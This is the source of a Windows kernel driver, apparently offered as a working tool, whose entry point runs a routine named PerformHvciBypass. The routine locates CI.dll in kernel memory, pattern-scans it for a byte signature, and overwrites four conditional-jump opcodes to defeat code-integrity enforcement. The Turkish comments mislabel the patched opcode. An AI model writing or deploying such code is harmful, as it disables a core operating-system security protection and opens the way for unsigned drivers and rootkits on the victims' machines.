#include <ntifs.h>
 
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemModuleInformation = 11, 
} SYSTEM_INFORMATION_CLASS;
 
 
typedef NTSTATUS(NTAPI* ZWQUERYSYSTEMINFORMATION)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );
 
 
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;
 
typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;
 
 
typedef struct _COPY_DATA {
    ULONGLONG address;
} COPY_DATA, * PCOPY_DATA;
 
 
typedef struct _MODULE_INFO {
    ULONG_PTR BaseAddress;
    ULONG ImageSize;
} MODULE_INFO, * PMODULE_INFO;
 
MODULE_INFO GetKernelModuleAddress(const char* name) {
    MODULE_INFO result = { 0 };
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0;
    PRTL_PROCESS_MODULES modules = NULL;
 
    UNICODE_STRING zwQuerySystemInfoName = RTL_CONSTANT_STRING(L"ZwQuerySystemInformation");
    ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformationFunc = (ZWQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&zwQuerySystemInfoName);
 
    if (!ZwQuerySystemInformationFunc) {
        return result;
    }
 
 
    status = ZwQuerySystemInformationFunc(SystemModuleInformation, buffer, bufferSize, &bufferSize);
 
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        buffer = ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'MODL');
        if (!buffer) {
            return result;
        }
 
 
        status = ZwQuerySystemInformationFunc(SystemModuleInformation, buffer, bufferSize, &bufferSize);
 
        if (NT_SUCCESS(status)) {
            modules = (PRTL_PROCESS_MODULES)buffer;
            for (ULONG i = 0; i < modules->NumberOfModules; i++) {
                char* currentName = (char*)modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
                if (_stricmp(currentName, name) == 0) {
                    result.BaseAddress = (ULONG_PTR)modules->Modules[i].ImageBase;
                    result.ImageSize = modules->Modules[i].ImageSize;
                    ExFreePoolWithTag(buffer, 'MODL');
                    return result;
                }
            }
        }
        else {
        }
    }
    else {
    }
 
    if (buffer) ExFreePoolWithTag(buffer, 'MODL');
    return result;
}
 
// Desen eşleştirme fonksiyonu (modül boyutu ile sınırlandırılmış)
ULONGLONG FindPatternImage(PCHAR base, ULONG moduleSize, PCHAR pattern, PCHAR mask) {
    SIZE_T length = strlen(mask);
 
    SIZE_T maxOffset = moduleSize - length;
    if (maxOffset > 0x1000000) maxOffset = 0x1000000; // Maksimum 16MB sınırını koru
 
    for (SIZE_T i = 0; i < maxOffset; i++) {
        if (!MmIsAddressValid(base + i)) {
            break;
        }
        BOOLEAN found = TRUE;
        for (SIZE_T j = 0; j < length; j++) {
            if (!MmIsAddressValid(base + i + j)) {
                found = FALSE;
                break;
            }
            if (mask[j] != '?' && pattern[j] != *(PCHAR)(base + i + j)) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            ULONGLONG resultAddress = (ULONGLONG)(base + i);
            return resultAddress;
        }
    }
    return 0;
}
 
 
NTSTATUS CopyCiAddr(PCOPY_DATA copyData) {
    MODULE_INFO ciModule = GetKernelModuleAddress("CI.dll");
    if (!ciModule.BaseAddress) {
        return STATUS_NOT_FOUND;
    }
 
    ULONGLONG address = FindPatternImage((PCHAR)ciModule.BaseAddress, ciModule.ImageSize,
        (PCHAR)"\x89\x4F\x00\xE8\x00\x00\x00\x00\x85\xC0",
        (PCHAR)"xx?x????xx");
 
    if (!address) {
        return STATUS_NOT_FOUND;
    }
 
 
    copyData->address = address;
    return STATUS_SUCCESS;
}
 
NTSTATUS WriteMemory(ULONGLONG address, UCHAR value) {
    if (!MmIsAddressValid((PVOID)address)) {
        return STATUS_INVALID_ADDRESS;
    }
 
    PMDL mdl = IoAllocateMdl((PVOID)address, sizeof(UCHAR), FALSE, FALSE, NULL);
    if (!mdl) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
 
    MmBuildMdlForNonPagedPool(mdl);
    PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);
    if (!mappedAddress) {
        IoFreeMdl(mdl);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
 
    *(PUCHAR)mappedAddress = value;
    MmUnmapLockedPages(mappedAddress, mdl);
    IoFreeMdl(mdl);
 
 
    return STATUS_SUCCESS;
}
 
 
NTSTATUS PerformHvciBypass() {
    NTSTATUS status;
    COPY_DATA copyData = { 0 };
    ULONGLONG ciAddress = 0;
 
    status = CopyCiAddr(&copyData);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    ciAddress = copyData.address;
 
    MODULE_INFO ciModule = GetKernelModuleAddress("CI.dll");
    ULONGLONG ciBase = ciModule.BaseAddress;
    ULONGLONG ciEnd = ciBase + ciModule.ImageSize;
 
 
    ULONGLONG offsets[] = { ciAddress + 0x2A, ciAddress + 0x3E, ciAddress + 0x50, ciAddress + 0x61 };
    for (int i = 0; i < 4; i++) {
        if (offsets[i] < ciBase || offsets[i] >= ciEnd) {
            return STATUS_INVALID_ADDRESS;
        }
        if (!MmIsAddressValid((PVOID)offsets[i])) {
            return STATUS_INVALID_ADDRESS;
        }
    }
 
    // Mevcut opcode'ları oku ve kontrol et
    UCHAR jz1 = *(PUCHAR)(ciAddress + 0x2A);
    UCHAR jz2 = *(PUCHAR)(ciAddress + 0x3E);
    UCHAR jz3 = *(PUCHAR)(ciAddress + 0x50);
    UCHAR jz4 = *(PUCHAR)(ciAddress + 0x61);
 
    if (jz1 == 0x75 && jz2 == 0x75 && jz3 == 0x75 && jz4 == 0x75) {
        return STATUS_SUCCESS;
    }
 
    // Opcode'ları 0x75 (JE) ile değiştir
    status = WriteMemory(ciAddress + 0x2A, 0x75);
    if (!NT_SUCCESS(status)) return status;
 
    status = WriteMemory(ciAddress + 0x3E, 0x75);
    if (!NT_SUCCESS(status)) return status;
 
    status = WriteMemory(ciAddress + 0x50, 0x75);
    if (!NT_SUCCESS(status)) return status;
 
    status = WriteMemory(ciAddress + 0x61, 0x75);
    if (!NT_SUCCESS(status)) return status;
 
   return STATUS_SUCCESS;
}
 
 
 
NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING registryPath) {
	UNREFERENCED_PARAMETER(driver);
	UNREFERENCED_PARAMETER(registryPath);
 
	return PerformHvciBypass();
}
